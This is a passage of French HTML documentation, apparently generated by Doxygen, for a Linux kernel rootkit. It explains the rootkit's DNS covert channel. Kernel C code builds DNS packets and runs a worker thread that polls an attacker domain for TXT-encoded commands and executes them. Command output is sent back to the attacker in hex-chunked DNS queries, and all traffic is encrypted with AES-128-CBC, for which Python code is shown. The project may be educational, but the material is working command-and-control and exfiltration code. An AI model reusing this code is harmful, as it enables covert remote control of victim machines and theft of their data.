<div class="ttc" id="astructdns__header__t_html_a5c1e988df4a22654a80ef9bbd5e83a13"><div class="ttname"><a href="../../de/dd9/structdns__header__t.html#a5c1e988df4a22654a80ef9bbd5e83a13">dns_header_t::nscount</a></div><div class="ttdeci">__be16 nscount</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d54/dns_8c_source.html#l00015">dns.c:15</a></div></div>
<div class="ttc" id="astructdns__header__t_html_a8374f34065d456334e3c63c2ff3306cb"><div class="ttname"><a href="../../de/dd9/structdns__header__t.html#a8374f34065d456334e3c63c2ff3306cb">dns_header_t::qdcount</a></div><div class="ttdeci">__be16 qdcount</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d54/dns_8c_source.html#l00013">dns.c:13</a></div></div>
<div class="ttc" id="astructdns__header__t_html_acb0a9a6e729d7ba375297cf625fc938b"><div class="ttname"><a href="../../de/dd9/structdns__header__t.html#acb0a9a6e729d7ba375297cf625fc938b">dns_header_t::ancount</a></div><div class="ttdeci">__be16 ancount</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d54/dns_8c_source.html#l00014">dns.c:14</a></div></div>
<div class="ttc" id="astructdns__header__t_html_af107879d493519cfa3dae4c4eb03e6c3"><div class="ttname"><a href="../../de/dd9/structdns__header__t.html#af107879d493519cfa3dae4c4eb03e6c3">dns_header_t::arcount</a></div><div class="ttdeci">__be16 arcount</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d54/dns_8c_source.html#l00016">dns.c:16</a></div></div>
<div class="ttc" id="astructdns__header__t_html_af4f7a53f6b2df72c34ca881f2714ac91"><div class="ttname"><a href="../../de/dd9/structdns__header__t.html#af4f7a53f6b2df72c34ca881f2714ac91">dns_header_t::flags</a></div><div class="ttdeci">__be16 flags</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d54/dns_8c_source.html#l00012">dns.c:12</a></div></div>
</div><!-- fragment --><p>Par ailleurs, la fonction <code>dns_send_query</code> est l‚Äô√©l√©ment central qui, dans <a class="el" href="../../d9/d54/dns_8c.html">dns.c</a>, construit √† la main un paquet DNS (en UDP) et l‚Äôenvoie au r√©solveur. Son prototype est <code><a class="el" href="../../d9/d54/dns_8c.html#af4fa4cede0d5ee503bc605138fea7da2" title="Send a single DNS question and receive the raw response.">dns_send_query()</a></code>. Apr√®s avoir allou√© dynamiquement le buffer qui contiendra la requ√™te dans son int√©gralit√©, on construit progressivement l‚Äôen-t√™te. </p><div class="fragment"><div class="line"><span class="keyword">struct </span><a class="code hl_struct" href="../../de/dd9/structdns__header__t.html">dns_header_t</a> *hdr = (<span class="keywordtype">void</span> *) packet_buffer;</div>
<div class="line">get_random_bytes(&amp;hdr-&gt;<a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#a555bb3191b65b5e9599f447653ed981d">id</a>, <span class="keyword">sizeof</span>(hdr-&gt;<a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#a555bb3191b65b5e9599f447653ed981d">id</a>));</div>
<div class="line">hdr-&gt;<a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#af4f7a53f6b2df72c34ca881f2714ac91">flags</a> = htons(0x0100);</div>
<div class="line">hdr-&gt;<a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#a8374f34065d456334e3c63c2ff3306cb">qdcount</a> = htons(1);</div>
<div class="line">hdr-&gt;<a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#acb0a9a6e729d7ba375297cf625fc938b">ancount</a> = htons(0);</div>
<div class="line">hdr-&gt;<a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#a5c1e988df4a22654a80ef9bbd5e83a13">nscount</a> = htons(0);</div>
<div class="line">hdr-&gt;<a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#af107879d493519cfa3dae4c4eb03e6c3">arcount</a> = htons(0);</div>
<div class="line">offset = <a class="code hl_define" href="../../db/d16/config_8h.html#ab45c21ad55157cd53ce4c58d5b7b449f">DNS_HDR_SIZE</a>;</div>
<div class="ttc" id="aconfig_8h_html_ab45c21ad55157cd53ce4c58d5b7b449f"><div class="ttname"><a href="../../db/d16/config_8h.html#ab45c21ad55157cd53ce4c58d5b7b449f">DNS_HDR_SIZE</a></div><div class="ttdeci">#define DNS_HDR_SIZE</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00044">config.h:44</a></div></div>
</div><!-- fragment --><h4><a class="anchor" id="autotoc_md59"></a>
3.2.2 QNAME</h4>
<p>Le champ <b>QNAME</b> repr√©sente le nom de domaine demand√©. En DNS, il est encod√© en <em>labels</em>. On parcourt donc apr√®s la construction du <em>header</em> la cha√Æne <code>query_name</code>. L'encodage est un peu particulier, car il faut pr√©c√©der chaque partie entre les points par sa longueur en hexad√©cimal. Imaginons <code>query_name = 01/04-abcdef.command.com</code>, on aura : </p><div class="fragment"><div class="line">[0D] 30 31 2F 30 34 2D 61 62 63 64 65 66    <span class="comment">// &quot;01/04-abcdef&quot; (13 chars)</span></div>
<div class="line">[07] 63 6F 6D 6D 61 6E 64                   <span class="comment">// &quot;command&quot; (7 chars)</span></div>
<div class="line">[03] 63 6F 6D                               <span class="comment">// &quot;com&quot; (3 chars)</span></div>
<div class="line">[00]                                        <span class="comment">// Terminaison du QNAME</span></div>
</div><!-- fragment --><p>Concernant le <b>QTYPE</b>, deux possibilit√©s existent selon l‚Äôappel de la fonction qui construit le paquet : soit 1 pour une requ√™te de type <b>A</b> (adresse IPv4), soit 16 pour une requ√™te de type <b>TXT</b> (texte). √Ä ce stade, la section <em>Question</em> du paquet est compl√®te : <em>header</em> (12 octets) + <b>QNAME</b> (labels + 0x00) + <b>QTYPE</b> (2 octets) + <b>QCLASS</b> (2 octets). <b>QCLASS</b> est le type de r√©seau ou de protocole pour lequel la requ√™te DNS est faite (1 pour internet ici). On a donc bien finalement la requ√™te DNS brute √† envoyer.</p>
<h4><a class="anchor" id="autotoc_md60"></a>
3.2.3 Socket</h4>
<div class="fragment"><div class="line"><span class="comment">// Create a UDP socket in kernel (need to hide it ?)</span></div>
<div class="line">result = sock_create_kern(&amp;init_net, AF_INET, SOCK_DGRAM, IPPROTO_UDP, &amp;sock);</div>
<div class="line"><span class="keywordflow">if</span> (result &lt; 0) {</div>
<div class="line">  kfree(packet_buffer);</div>
<div class="line">  <span class="keywordflow">return</span> result;</div>
<div class="line">}</div>
<div class="line">  </div>
<div class="line"><span class="comment">// Prepare the destination address</span></div>
<div class="line">memset(&amp;dest_addr, 0, <span class="keyword">sizeof</span>(dest_addr));</div>
<div class="line">dest_addr.sin_family = AF_INET;</div>
<div class="line">dest_addr.sin_port = htons(<a class="code hl_define" href="../../db/d16/config_8h.html#ab1d3f5c08428c20521a92ca2fa20f46c">DNS_PORT</a>);</div>
<div class="line">in4_pton(<a class="code hl_variable" href="../../db/d16/config_8h.html#afbc356cd0e25d1dbbece7c10fd025fa6">ip</a>, -1, (u8 *)&amp;dest_addr.sin_addr.s_addr, -1, NULL);</div>
<div class="line"> </div>
<div class="line"><span class="comment">// Tell kernel_sendmsg where to send</span></div>
<div class="line">msg.msg_name = &amp;dest_addr;</div>
<div class="line">msg.msg_namelen = <span class="keyword">sizeof</span>(dest_addr);</div>
<div class="line"> </div>
<div class="line"><span class="comment">// Send the DNS query</span></div>
<div class="line">iov.iov_base = packet_buffer;</div>
<div class="line">iov.iov_len = offset;</div>
<div class="line">result = kernel_sendmsg(sock, &amp;msg, &amp;iov, 1, offset);</div>
<div class="line"><span class="keywordflow">if</span> (result &lt; 0) {</div>
<div class="line">  sock_release(sock);</div>
<div class="line">  kfree(packet_buffer);</div>
<div class="line">  <span class="keywordflow">return</span> result;</div>
<div class="line">}</div>
<div class="ttc" id="aconfig_8h_html_ab1d3f5c08428c20521a92ca2fa20f46c"><div class="ttname"><a href="../../db/d16/config_8h.html#ab1d3f5c08428c20521a92ca2fa20f46c">DNS_PORT</a></div><div class="ttdeci">#define DNS_PORT</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00042">config.h:42</a></div></div>
<div class="ttc" id="aconfig_8h_html_afbc356cd0e25d1dbbece7c10fd025fa6"><div class="ttname"><a href="../../db/d16/config_8h.html#afbc356cd0e25d1dbbece7c10fd025fa6">ip</a></div><div class="ttdeci">char * ip</div><div class="ttdef"><b>Definition</b> <a href="../../d0/d29/main_8c_source.html#l00006">main.c:6</a></div></div>
</div><!-- fragment --><p>La cr√©ation de la socket et l'envoi du message sont ensuite assez classiques :</p><ul>
<li><code>sock_create_kern</code> cr√©e une socket UDP depuis l‚Äôespace noyau.</li>
<li><code>dest_addr.sin_port = htons(DNS_PORT)</code> configure le port 53 (voir <a class="el" href="../../db/d16/config_8h.html">config.h</a>).</li>
<li><code>in4_pton(ip, ...)</code> convertit l‚Äôadresse IP du serveur DNS en <code>sin_addr.s_addr</code></li>
<li><code>kernel_sendmsg</code> envoie la requ√™te DNS en une seule op√©ration. <em>Bam !</em></li>
</ul>
<h4><a class="anchor" id="autotoc_md61"></a>
3.2.4 R√©ponse</h4>
<p>Toujours dans la m√™me fonction de <a class="el" href="../../d9/d54/dns_8c.html">dns.c</a>, on re√ßoit une r√©ponse de mani√®re non bloquante, que l‚Äôon enregistre dans les buffers point√©s par les param√®tres de la fonction. L‚Äôinterpr√©tation de la r√©ponse est effectu√©e dans une autre fonction que nous verrons par la suite. </p><div class="fragment"><div class="line">iov.iov_base = packet_buffer;</div>
<div class="line">iov.iov_len = <a class="code hl_define" href="../../db/d16/config_8h.html#aa1a62a1468067c7b022a024325225702">DNS_MAX_BUF</a>;</div>
<div class="line">result = kernel_recvmsg(sock, &amp;msg, &amp;iov, 1, <a class="code hl_define" href="../../db/d16/config_8h.html#aa1a62a1468067c7b022a024325225702">DNS_MAX_BUF</a>, MSG_DONTWAIT);</div>
<div class="line"><span class="keywordflow">if</span> (result &gt; 0) {</div>
<div class="line">  memcpy(response_buffer, packet_buffer, result);</div>
<div class="line">  *response_length = result;</div>
<div class="line">  result = 0;</div>
<div class="line">}</div>
<div class="line"><span class="keywordflow">else</span> <span class="keywordflow">if</span> (result == -EAGAIN || result == -EWOULDBLOCK) {</div>
<div class="line">  *response_length = 0;</div>
<div class="line">  result = 0;</div>
<div class="line">}</div>
<div class="ttc" id="aconfig_8h_html_aa1a62a1468067c7b022a024325225702"><div class="ttname"><a href="../../db/d16/config_8h.html#aa1a62a1468067c7b022a024325225702">DNS_MAX_BUF</a></div><div class="ttdeci">#define DNS_MAX_BUF</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00043">config.h:43</a></div></div>
</div><!-- fragment --><h3><a class="anchor" id="autotoc_md62"></a>
3.3 üéØ Commandes</h3>
<h4><a class="anchor" id="autotoc_md63"></a>
3.3.1 Worker</h4>
<p>Par ailleurs, le fichier <a class="el" href="../../d2/d22/dns_2worker_8c.html">dns/worker.c</a> contient un thread noyau d√©di√© √† la gestion continue des paquets DNS, en particulier √† la r√©ception des commandes. Ce thread ex√©cute une boucle principale qui interroge r√©guli√®rement le serveur attaquant pour r√©cup√©rer des instructions. Il est responsable des op√©rations suivantes :</p><ul>
<li>Interroger p√©riodiquement l‚Äôattaquant via une requ√™te TXT vers <code>command.DNS_DOMAIN</code>.</li>
<li>Si l‚Äôattaquant a mis une commande en attente, il la renvoie dans le champ TXT de la r√©ponse.</li>
<li>Le rootkit sur la victime ex√©cute cette commande.</li>
<li>Il renvoie ensuite la sortie de la commande (stdout/stderr/status) vers l‚Äôattaquant en utilisant <code>dns_send_data</code> dans <code><a class="el" href="../../d6/d6e/network_8c.html#a375e772b2efc7540285ea61d2c9e5694">send_to_server()</a></code> dans <a class="el" href="../../d6/d6e/network_8c.html">network.c</a>.</li>
</ul>
<div class="fragment"><div class="line"><span class="keyword">static</span> <span class="keywordtype">int</span> <a class="code hl_function" href="../../d2/d22/dns_2worker_8c.html#af15c7f87e4d52b4b1732abca083eb7e5">dns_worker</a>(<span class="keywordtype">void</span> *data) {</div>
<div class="line">  <span class="keywordtype">char</span> cmd_buf[<a class="code hl_define" href="../../db/d16/config_8h.html#accf0ac1ee8fd5b93a4a6b17582a022d5">RCV_CMD_BUFFER_SIZE</a> / 2];</div>
<div class="line"> </div>
<div class="line">  <span class="keywordflow">while</span> (!kthread_should_stop()) {</div>
<div class="line">    <span class="keywordtype">int</span> len = <a class="code hl_function" href="../../d9/d94/network_8h.html#a09e9c16fc7b47ed89818ee2a68368871">dns_receive_command</a>(cmd_buf, <span class="keyword">sizeof</span>(cmd_buf));</div>
<div class="line">      <span class="keywordflow">if</span> (len &gt; 0) {</div>
<div class="line">  </div>
<div class="line">        <span class="comment">// Send the command to the command handler</span></div>
<div class="line">        <a class="code hl_function" href="../../da/d32/cmd_8c.html#a7ed5a3859749957ee97404fa3484b22a">rootkit_command</a>(cmd_buf, len + 1, <a class="code hl_enumvalue" href="../../db/d16/config_8h.html#aac39b55be6469395f55ff0292ad8184cacb351e08d637347c1132ba8a73f0c812">DNS</a>);</div>
<div class="line">      }</div>
<div class="line"> </div>
<div class="line">      <span class="comment">// Sleep for a defined interval to avoid busy-waiting</span></div>
<div class="line">      msleep(<a class="code hl_define" href="../../db/d16/config_8h.html#acb370f80e5c43bcf22adc426fe44537d">DNS_POLL_INTERVAL_MS</a>);</div>
<div class="line">  }</div>
<div class="line"> </div>
<div class="line">  <span class="keywordflow">return</span> 0;</div>
<div class="line">}</div>
<div class="ttc" id="acmd_8c_html_a7ed5a3859749957ee97404fa3484b22a"><div class="ttname"><a href="../../da/d32/cmd_8c.html#a7ed5a3859749957ee97404fa3484b22a">rootkit_command</a></div><div class="ttdeci">int rootkit_command(char *command, unsigned command_size, enum Protocol protocol)</div><div class="ttdef"><b>Definition</b> <a href="../../da/d32/cmd_8c_source.html#l00122">cmd.c:122</a></div></div>
<div class="ttc" id="aconfig_8h_html_aac39b55be6469395f55ff0292ad8184cacb351e08d637347c1132ba8a73f0c812"><div class="ttname"><a href="../../db/d16/config_8h.html#aac39b55be6469395f55ff0292ad8184cacb351e08d637347c1132ba8a73f0c812">DNS</a></div><div class="ttdeci">@ DNS</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00030">config.h:30</a></div></div>
<div class="ttc" id="aconfig_8h_html_acb370f80e5c43bcf22adc426fe44537d"><div class="ttname"><a href="../../db/d16/config_8h.html#acb370f80e5c43bcf22adc426fe44537d">DNS_POLL_INTERVAL_MS</a></div><div class="ttdeci">#define DNS_POLL_INTERVAL_MS</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00041">config.h:41</a></div></div>
<div class="ttc" id="aconfig_8h_html_accf0ac1ee8fd5b93a4a6b17582a022d5"><div class="ttname"><a href="../../db/d16/config_8h.html#accf0ac1ee8fd5b93a4a6b17582a022d5">RCV_CMD_BUFFER_SIZE</a></div><div class="ttdeci">#define RCV_CMD_BUFFER_SIZE</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00037">config.h:37</a></div></div>
<div class="ttc" id="adns_2worker_8c_html_af15c7f87e4d52b4b1732abca083eb7e5"><div class="ttname"><a href="../../d2/d22/dns_2worker_8c.html#af15c7f87e4d52b4b1732abca083eb7e5">dns_worker</a></div><div class="ttdeci">static int dns_worker(void *data)</div><div class="ttdoc">Kernel thread function to process DNS-based commands.</div><div class="ttdef"><b>Definition</b> <a href="../../d2/d22/dns_2worker_8c_source.html#l00017">dns/worker.c:17</a></div></div>
<div class="ttc" id="anetwork_8h_html_a09e9c16fc7b47ed89818ee2a68368871"><div class="ttname"><a href="../../d9/d94/network_8h.html#a09e9c16fc7b47ed89818ee2a68368871">dns_receive_command</a></div><div class="ttdeci">int dns_receive_command(char *buffer, size_t max_len)</div><div class="ttdoc">Poll the attacker via DNS TXT-query for a pending command.</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d54/dns_8c_source.html#l00222">dns.c:222</a></div></div>
</div><!-- fragment --><h4><a class="anchor" id="autotoc_md64"></a>
3.3.2 R√©ception</h4>
<p>L‚Äôinterpr√©tation de la commande re√ßue via une requ√™te <b>TXT</b> dans le <em>worker</em> est assur√©e par la fonction <code><a class="el" href="../../d9/d94/network_8h.html#a09e9c16fc7b47ed89818ee2a68368871" title="Poll the attacker via DNS TXT-query for a pending command.">dns_receive_command()</a></code>. Comme √©voqu√© pr√©c√©demment, cette fonction s‚Äôappuie sur <code>dns_send_query</code>, un <em>wrapper</em> g√©n√©rique charg√© d‚Äô√©mettre la requ√™te DNS. Une fois la requ√™te envoy√©e, la victime lit la r√©ponse brute dans le buffer <code>response_buffer_local</code>. Elle en extrait ensuite le contenu textuel situ√© dans la section <em>Answer TXT</em> du paquet DNS. La fonction <code>dns_receive_command</code> copie cette cha√Æne dans <code>cmd_buf</code> (via le param√®tre <code>out_buffer</code>) et retourne la longueur du texte extrait. </p><div class="fragment"><div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../d9/d94/network_8h.html#a09e9c16fc7b47ed89818ee2a68368871">dns_receive_command</a>(<span class="keywordtype">char</span> *out_buffer, <span class="keywordtype">size_t</span> max_length) {</div>
<div class="line">  <span class="keywordtype">char</span> *poll_qname;</div>
<div class="line">  u8 *response_buffer_local;</div>
<div class="line">  <span class="keywordtype">int</span> response_length_local;</div>
<div class="line">  <span class="keywordtype">int</span> result;</div>
<div class="line">  <span class="keyword">struct </span><a class="code hl_struct" href="../../de/dd9/structdns__header__t.html">dns_header_t</a> *hdr;</div>
<div class="line">  u16 answer_count;</div>
<div class="line">  <span class="keywordtype">int</span> offset;</div>
<div class="line"> </div>
<div class="line">  <span class="comment">// Allocate local response buffer</span></div>
<div class="line">  response_buffer_local = kzalloc(<a class="code hl_define" href="../../db/d16/config_8h.html#aa1a62a1468067c7b022a024325225702">DNS_MAX_BUF</a>, GFP_KERNEL);</div>
<div class="line">  <span class="keywordflow">if</span> (!response_buffer_local)</div>
<div class="line">    <span class="keywordflow">return</span> -ENOMEM;</div>
<div class="line"> </div>
<div class="line">  <span class="comment">// Build the TXT-poll query name</span></div>
<div class="line">  poll_qname = kmalloc(128, GFP_KERNEL);</div>
<div class="line">  snprintf(poll_qname, 128, <span class="stringliteral">&quot;command.%s&quot;</span>, <a class="code hl_define" href="../../db/d16/config_8h.html#a62787143a36288db9af243c8bec2aa3b">DNS_DOMAIN</a>);</div>
<div class="line"> </div>
<div class="line">  <span class="comment">// Send TXT query and get raw response</span></div>
<div class="line">  result = <a class="code hl_function" href="../../d9/d54/dns_8c.html#af4fa4cede0d5ee503bc605138fea7da2">dns_send_query</a>(poll_qname, htons(16), response_buffer_local, &amp;response_length_local);</div>
<div class="line">  kfree(poll_qname);</div>
<div class="line">  <span class="keywordflow">if</span> (result &lt; 0) {</div>
<div class="line">    kfree(response_buffer_local);</div>
<div class="line">    <span class="keywordflow">return</span> -EIO;</div>
<div class="line">  }</div>
<div class="line"> </div>
<div class="line">  <span class="comment">// Parse DNS header and answer count</span></div>
<div class="line">  hdr = (<span class="keyword">struct </span><a class="code hl_struct" href="../../de/dd9/structdns__header__t.html">dns_header_t</a> *)response_buffer_local;</div>
<div class="line">  answer_count = ntohs(hdr-&gt;<a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#acb0a9a6e729d7ba375297cf625fc938b">ancount</a>);</div>
<div class="line">...</div>
<div class="ttc" id="aconfig_8h_html_a62787143a36288db9af243c8bec2aa3b"><div class="ttname"><a href="../../db/d16/config_8h.html#a62787143a36288db9af243c8bec2aa3b">DNS_DOMAIN</a></div><div class="ttdeci">#define DNS_DOMAIN</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00048">config.h:48</a></div></div>
<div class="ttc" id="adns_8c_html_af4fa4cede0d5ee503bc605138fea7da2"><div class="ttname"><a href="../../d9/d54/dns_8c.html#af4fa4cede0d5ee503bc605138fea7da2">dns_send_query</a></div><div class="ttdeci">static int dns_send_query(const char *query_name, __be16 question_type, u8 *response_buffer, int *response_length)</div><div class="ttdoc">Send a single DNS question and receive the raw response.</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d54/dns_8c_source.html#l00035">dns.c:35</a></div></div>
</div><!-- fragment --><h3><a class="anchor" id="autotoc_md65"></a>
3.4 üõ∞Ô∏è Exfiltration</h3>
<p>Pour transmettre des donn√©es, la machine victime utilise la fonction <code><a class="el" href="../../d9/d94/network_8h.html#a1f3fd0d4b58aa92d0cf7a54c4af03671" title="Exfiltrate a data buffer over DNS by hex-chunked A-queries.">dns_send_data()</a></code>. Cette fonction fragmente un flux de donn√©es binaires en <em>chunks</em>, les chiffre, les <em>hexify</em> (pour s‚Äôassurer d‚Äôavoir des caract√®res compatibles avec le protocole DNS), puis les envoie via une s√©rie de requ√™tes DNS. Du c√¥t√© de l‚Äôattaquant, un serveur √©coute ces requ√™tes et recompose les blocs afin de reconstituer l‚Äôinformation initiale. Chaque chunk est encod√© dans un nom de domaine respectant les contraintes du protocole DNS. Concr√®tement, un chunk est transmis sous la forme <em>&lt;xx&gt;/&lt;xx&gt;-&lt;qname&gt;</em>, comme illustr√© pr√©c√©demment. Le d√©coupage est effectu√© au niveau des octets, avec une taille maximale d√©finie par DNS_MAX_CHUNK (28 octets utiles). Cette limite permet de s‚Äôassurer que, m√™me apr√®s encodage hexad√©cimal et ajout de pr√©fixes, le QNAME g√©n√©r√© reste conforme √† la norme : moins de 253 octets au total et moins de 63 caract√®res entre chaque point (<a href="https://www.ietf.org/rfc/rfc1035.txt">RFC1035</a>)</p>
<h2><a class="anchor" id="autotoc_md66"></a>
4. üîí Chiffrement</h2>
<p>Pour garantir la confidentialit√© des √©changes entre le client et le serveur, toutes les donn√©es sont chiffr√©es √† l‚Äôaide de l‚Äôalgorithme <b>AES-128</b> en mode <b>CBC</b> (Cipher Block Chaining). Ce choix assure √† la fois une simplicit√© d‚Äôimpl√©mentation gr√¢ce √† l'API de chiffrement du noyau Linux, et une s√©curit√© suffisante pour les besoins de ce projet. Le chiffrement est appliqu√© √† tous les messages √©chang√©s, qu‚Äôil s‚Äôagisse de commandes, de r√©ponses ou de simples donn√©es.</p>
<h4><a class="anchor" id="autotoc_md67"></a>
Principes</h4>
<table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadNone">√âl√©ment   </th><th class="markdownTableHeadNone">D√©tail    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><b>Cl√© &amp; IV</b>   </td><td class="markdownTableBodyNone">Cl√© de chiffrement (<code>key</code>) et vecteur d‚Äôinitialisation (<code>iv</code>) de <b>16 octets</b> (128 bits), conform√©ment √† la <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">sp√©cification AES-128</a>.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone"><b>Mode CBC</b>   </td><td class="markdownTableBodyNone">Le mode CBC introduit une d√©pendance entre blocs chiffr√©s, renfor√ßant la s√©curit√© contre certaines attaques.<br  />
Choisi pour sa simplicit√© d‚Äôimpl√©mentation et sa robustesse lors des tests.    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><b>Padding PKCS7</b>   </td><td class="markdownTableBodyNone">AES requiert que les donn√©es soient un multiple de 16 octets.<br  />
Le <a href="https://en.wikipedia.org/wiki/Padding_%28cryptography%29#PKCS7">padding PKCS7</a> compl√®te automatiquement les donn√©es et est retir√© apr√®s d√©chiffrement.   </td></tr>
</table>
<h4><a class="anchor" id="autotoc_md68"></a>
Impl√©mentation</h4>
<p>Voici l'implementation Python du chiffrement AES-128-CBC avec padding PKCS7, pr√©sente dans le fichier <a class="el" href="../../da/d77/CryptoHandler_8py.html">CryptoHandler.py</a> :</p>
<div class="fragment"><div class="line"><span class="keyword">class </span><a class="code hl_namespace" href="../../dd/dbe/namespaceCryptoHandler.html">CryptoHandler</a>:</div>
<div class="line">    <span class="keyword">def </span>__init__(self, key: bytes, iv: bytes):</div>
<div class="line">        <span class="keywordflow">if</span> len(key) != 16 <span class="keywordflow">or</span> len(iv) != 16:</div>
<div class="line">            <span class="keywordflow">raise</span> ValueError(<span class="stringliteral">&quot;The key and IV must be exactly 16 bytes.&quot;</span>)</div>
<div class="line">        self.key = key</div>
<div class="line">        self.iv = iv</div>
<div class="line"> </div>
<div class="line">    <span class="keyword">def </span>encrypt(self, plaintext: str | bytes) -&gt; bytes:</div>
<div class="line">        <span class="keywordflow">if</span> isinstance(plaintext, str):</div>
<div class="line">            plaintext = plaintext.encode(<span class="stringliteral">&#39;utf-8&#39;</span>)</div>
<div class="line">        padder = padding.PKCS7(algorithms.AES.block_size).padder()</div>
<div class="line">        padded_data = padder.update(plaintext) + padder.finalize()</div>
<div class="line">        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=default_backend())</div>
<div class="line">        encryptor = cipher.encryptor()</div>
<div class="line">        <span class="keywordflow">return</span> encryptor.update(padded_data) + encryptor.finalize()</div>
<div class="line"> </div>
<div class="line">    <span class="keyword">def </span>decrypt(self, ciphertext: bytes) -&gt; str:</div>
<div class="line">        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=default_backend())</div>
<div class="line">        decryptor = cipher.decryptor()</div>
<div class="line">        padded_data = decryptor.update(ciphertext) + decryptor.finalize()</div>
<div class="line">        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()</div>
<div class="line">        data = unpadder.update(padded_data) + unpadder.finalize()</div>
<div class="line">        <span class="keywordflow">return</span> data.decode(<span class="stringliteral">&#39;utf-8&#39;</span>, errors=<span class="stringliteral">&#39;ignore&#39;</span>)</div>
<div class="ttc" id="anamespaceCryptoHandler_html"><div class="ttname"><a href="../../dd/dbe/namespaceCryptoHandler.html">CryptoHandler</a></div><div class="ttdef"><b>Definition</b> <a href="../../da/d77/CryptoHandler_8py_source.html#l00001">CryptoHandler.py:1</a></div></div>
</div><!-- fragment --><p><b>Points cl√©s de l‚Äôimpl√©mentation</b></p>
<ul>
<li>Chiffrement‚ÄØ: <br  />
<ol type="1">
<li>Conversion √©ventuelle de la cha√Æne en bytes.</li>
<li>Application du padding PKCS7.</li>
<li>Cr√©ation d‚Äôun objet Cipher en mode CBC.</li>
<li>Chiffrement des donn√©es padd√©es.</li>
</ol>
</li>
<li>D√©chiffrement‚ÄØ: <br  />
<ol type="1">
<li>D√©chiffrement du ciphertext.</li>
<li>Suppression du padding PKCS7.</li>
<li>D√©codage en UTF-8.</li>
</ol>
</li>
</ul>
<h4><a class="anchor" id="autotoc_md69"></a>
R√©sum√©</h4>
<ul>
<li><b>AES-128-CBC</b> avec <b>PKCS7</b> est utilis√© pour tous les √©changes.</li>
<li>La cl√© et l‚ÄôIV sont de 16 octets.</li>
<li>Le padding est appliqu√© avant chiffrement et retir√© apr√®s d√©chiffrement.</li>
<li>L‚Äôimpl√©mentation est identique c√¥t√© Python et C pour garantir l‚Äôinterop√©rabilit√©.</li>
</ul>
<p><img src="../../logo_no_text.png" alt="" style="
    display: block;
    margin: 100px auto;
    width: 30%;
    overflow: hidden;
  " class="inline"/> </p>
</div></div><!-- contents -->
</div><!-- PageDoc -->
</div><!-- doc-content -->

<div id="nav-path" class="navpath"><!-- id is needed for treeview function! --></div>
</body>
</html>
